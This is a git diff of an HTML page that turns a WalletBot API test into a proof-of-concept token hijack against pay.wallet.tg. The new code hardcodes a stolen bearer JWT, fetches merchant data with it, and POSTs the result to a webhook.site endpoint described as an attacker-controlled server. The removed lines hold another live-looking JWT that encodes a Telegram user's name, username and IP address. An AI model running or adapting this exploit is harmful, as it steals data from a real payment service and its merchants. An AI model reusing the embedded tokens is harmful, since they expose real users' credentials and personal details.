@@ -1,28 +1,37 @@
 <!DOCTYPE html>
-<html>
-  <body>
-    <h2>Testing WalletBot API with Token</h2>
-    <pre id="output">Loading...</pre>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PoC: Token Hijack to Exfil Merchant Data</title>
+</head>
+<body>
+  <h1>PoC: Bearer Token Hijack</h1>
+  <p>Open console for exfil test...</p>
 
-    <script>
-      fetch("https://walletbot.me/scwapi/escrow/transactions?perPage=1", {
-        method: "GET",
+  <script>
+    const stolenToken = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyMjQxNDA2N30.fhIjbSJy6YqifI60URimGdVwPK3t_cM70AUXklvcaSXOoVYDjoNtDpleWEP9h3FCS0ZuSM7k8cY5D6Jfdb_DOA"; // Replace with your test token
+
+    fetch("https://pay.wallet.tg/wpay/website-api/v1/merchant", {
+      method: "GET",
+      headers: {
+        "Authorization": stolenToken,
+        "Accept": "application/json"
+      }
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log("✅ Data exfiltrated from pay.wallet.tg:", data);
+
+      // Exfiltrate to your controlled server (e.g., webhook.site or custom endpoint)
+      fetch("https://webhook.site/cfb89b16-1571-4db3-b282-adc26a5c8f57", {
+        method: "POST",
         headers: {
-          "Accept": "application/json",
-          "Wallet-Authorization": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo2NDc1ODg5LCJ3ZWJfdmlld19pbml0X2RhdGEiOnsicXVlcnlfaWQiOm51bGwsInVzZXIiOnsiaWQiOjE2MjQ2MzM2NjMsImlzX2JvdCI6bnVsbCwiZmlyc3RfbmFtZSI6IktpeW90YWthIiwibGFzdF9uYW1lIjoiQXlhbm9rb2ppIiwidXNlcm5hbWUiOiJzdXJhanBhd2FyNjYyMSIsImxhbmd1YWdlX2NvZGUiOiJlbiIsImFsbG93c193cml0ZV90b19wbSI6dHJ1ZSwicGhvdG9fdXJsIjoiaHR0cHM6Ly90Lm1lL2kvdXNlcnBpYy8zMjAvbXRrQkR2b19DNmFyNjBkLXJfNnZrQUo5S1ZzTWUxSERwS2dFZU82d3E0cy5zdmciLCJhZGRlZF90b19hdHRhY2htZW50X21lbnUiOnRydWUsImlzX3ByZW1pdW0iOm51bGx9LCJyZWNlaXZlciI6bnVsbCwic3RhcnRfcGFyYW0iOm51bGwsImF1dGhfZGF0ZSI6MTc1MDUwODE2NiwiaGFzaCI6ImEwNGMwY2M1YTg0YTMzNWY5NDMwZWIzYjNhMWMxNGU4YWVkZGNjMWY4MGNlMGZkMjM1MzkzZmYyODFkN2RiNzciLCJjb3VudHJ5X2NvZGVfYnlfaXAiOiJJTiIsImlwIjoiNTkuMTUyLjEyMC4xIiwidGdfdXNlcl9pZCI6NjQ3MDU1M30sIndhbGxldF9kYXRhIjp7InVzZXIiOnsibG9jYWxfY3VycmVuY3kiOiJVU0QiLCJib3RfbGFuZ3VhZ2UiOiJlbiJ9fSwibWFpbl9kYXRhIjpudWxsLCJleHAiOjE3NTA1MDg3NjgsInZlcnNpb24iOjJ9.yEGTeQnZA9G8uT4b-Vw1SnPUWw8eopjab9ENDiyJi0FYJHxectS6kwthSFyswEIcr4_a2fqgdog4nOutjSKYNw"
+          "Content-Type": "application/json"
         },
-        credentials: "include", // correct usage
-        mode: "cors"
-      })
-      .then(res => res.text())
-      .then(data => {
-        document.getElementById("output").textContent = data;
-        console.log("API Response:", data);
-      })
-      .catch(err => {
-        console.error("Request failed:", err);
-        document.getElementById("output").textContent = "Fetch failed: " + err;
+        body: JSON.stringify({ stolenMerchantData: data })
       });
-    </script>
-  </body>
+    })
+    .catch(err => console.error("❌ Exploit failed:", err));
+  </script>
+</body>
 </html>
